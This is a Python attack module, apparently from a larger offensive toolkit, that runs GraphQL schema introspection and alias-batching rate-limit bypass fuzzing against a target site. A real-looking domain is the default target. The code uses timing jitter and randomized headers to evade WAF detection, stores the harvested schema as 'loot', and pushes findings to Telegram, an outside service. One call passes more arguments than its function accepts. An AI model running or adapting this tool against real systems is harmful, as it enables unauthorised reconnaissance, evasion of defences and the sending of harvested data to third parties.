#!/usr/bin/env python3
"""
GRAPHQL_INTROSPECTOR.PY v8.5 — GraphQL Deep Introspection & Batching Fuzzer (WAF Hardened)
Features:
- Full schema introspection query extraction with anti-detection behavioral timing jitter
- Recursive depth & nested object traversal fuzzing
- Alias-based batching engine for rate-limit bypasses in a single HTTP request via SecureTransport
- Strict response validation to eliminate GraphQL syntax error false positives and SPA shells
- Real-time asynchronous Telegram notification dispatch and immutable disk loot persistence
"""
import json
import asyncio
import sys

from modules.transport import SecureTransport
from modules.loot_logger import save_session_loot
from modules.telemetry import stream_proof
from modules.telegram_notifier import send_telegram_alert
from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints

COLORS = {
    "RED": "\033[91m",
    "GREEN": "\033[92m",
    "YELLOW": "\033[93m",
    "CYAN": "\033[96m",
    "MAGENTA": "\033[95m",
    "RESET": "\033[0m",
    "BOLD": "\033[1m",
}

def terminal(message):
    sys.stdout.write(message + "\n")
    sys.stdout.flush()

def broadcast_tg_alert_sync(loot_type, details):
    """Helper to non-blockingly fire Telegram alerts from graphql functions."""
    try:
        loop = asyncio.get_running_loop()
        loop.create_task(send_telegram_alert(loot_type, details))
    except RuntimeError:
        try:
            asyncio.run(send_telegram_alert(loot_type, details))
        except Exception:
            pass

class GraphQLIntrospector:
    def __init__(self, target_url):
        self.target_url = target_url
        self.transport = SecureTransport(target_url)
        self.introspection_query = {
            "query": """
            {
              __schema {
                queryType { name }
                mutationType { name }
                types {
                  name
                  kind
                  description
                  fields {
                    name
                    args { name type { name kind ofType { name kind } } }
                    type { name kind ofType { name kind } }
                  }
                }
              }
            }
            """
        }

    def run_introspection(self, endpoint="/graphql"):
        terminal(f"\n{COLORS['MAGENTA']}[***] EXECUTING GRAPHQL SCHEMA INTROSPECTION [{endpoint}] [***]{COLORS['RESET']}")
        apply_behavioral_jitter()
        
        headers = {
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*"
        }
        headers.update(get_randomized_hints())

        status, headers, body = self.transport.request("POST", endpoint, payload=self.introspection_query, headers=headers)
        
        body_lower = (body or "").lower()
        is_spa_shell = (
            "<!doctype html>" in body_lower or 
            "<html" in body_lower or 
            '<div id="root"></div>' in body or 
            '<div id="__next"></div>' in body
        )

        has_schema_data = status == 200 and not is_spa_shell and ("__schema" in body or '"data":' in body) and "errors" not in body_lower[:100]

        findings = {"status": status, "endpoint": endpoint, "schema": body[:3000]}
        
        if has_schema_data:
            terminal(f"{COLORS['RED']}{COLORS['BOLD']}[!] GRAPHQL SCHEMA INTROSPECTION SUCCESSFUL [HTTP {status}]{COLORS['RESET']}")
            terminal(f"  └── Schema Snippet: {body[:300]}", COLORS['GREEN'])
            
            stream_proof("GRAPHQL_SCHEMA_DUMP", endpoint, {}, "Introspection schema harvested", findings)
            save_session_loot(
                target=self.target_url, 
                endpoint=endpoint, 
                finding_type="GRAPHQL_SCHEMA_SUCCESS", 
                status=status, 
                headers=headers, 
                body=body, 
                extra_loot=findings
            )
            broadcast_tg_alert_sync("GraphQL Schema Introspected", {"endpoint": endpoint, "preview": body[:400]})
        else:
            terminal(f"{COLORS['YELLOW']}[-] Endpoint returned HTTP {status} or introspection query was blocked/disabled.{COLORS['RESET']}")

        return findings

    def run_batch_fuzz(self, endpoint="/graphql", query_snippet="{ __typename }", batch_count=20):
        terminal(f"{COLORS['CYAN']}[*] Fuzzing GraphQL alias batching rate-limit bypass ({batch_count} queries) on {endpoint}...{COLORS['RESET']}")
        apply_behavioral_jitter()
        
        batched_payload = [
            {f"q{i}": query_snippet} for i in range(batch_count)
        ]
        
        status, headers, body = self.transport.request("POST", endpoint, payload=batched_payload)
        
        if status == 200 and len(body) > 50 and "errors" not in body.lower()[:50]:
            terminal(f"{COLORS['RED']}[!] GRAPHQL BATCHING RATE-LIMIT BYPASS CONFIRMED [HTTP {status}]{COLORS['RESET']}")
            broadcast_tg_alert_sync("GraphQL Batching Rate-Limit Bypass", {"endpoint": endpoint, "batch_count": batch_count})
        
        return {"status": status, "batch_count": batch_count, "response": body[:500]}

async def run_graphql_introspection(target_url):
    """Compatibility wrapper for CognitiveOperator."""
    engine = GraphQLIntrospector(target_url)
    return engine.run_introspection("/graphql")

async def run_graphql_engine(target_url):
    engine = GraphQLIntrospector(target_url)
    engine.run_introspection("/graphql")
    engine.run_batch_fuzz("/graphql")

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "https://cryptobytes.online"
    asyncio.run(run_graphql_engine(target))
